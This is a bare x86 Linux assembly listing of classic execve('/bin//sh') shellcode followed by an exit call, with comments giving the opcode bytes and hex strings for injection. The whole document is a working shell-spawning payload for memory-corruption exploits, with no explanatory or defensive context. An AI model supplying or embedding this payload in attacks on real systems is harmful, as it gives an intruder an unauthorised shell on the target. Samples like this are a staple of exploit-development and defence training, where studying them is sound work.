.section .text
  xor eax, eax    	
  push eax       	# .byte 0x50                     # .ascii "50"
  push 0x68732f2f	# .byte 0x68,0x2f,0x2f,0x73,0x68 # .ascii "682f2f7368"
  push 0x6e69622f	# .byte 0x68,0x2f,0x62,0x69,0x6e # .ascii "682f62696e"
  mov ebx,esp
  mov ecx, eax
  mov edx, eax    	
  mov al, 0xb
  int 0x80
  xor eax, eax
  inc eax
  int 0x80
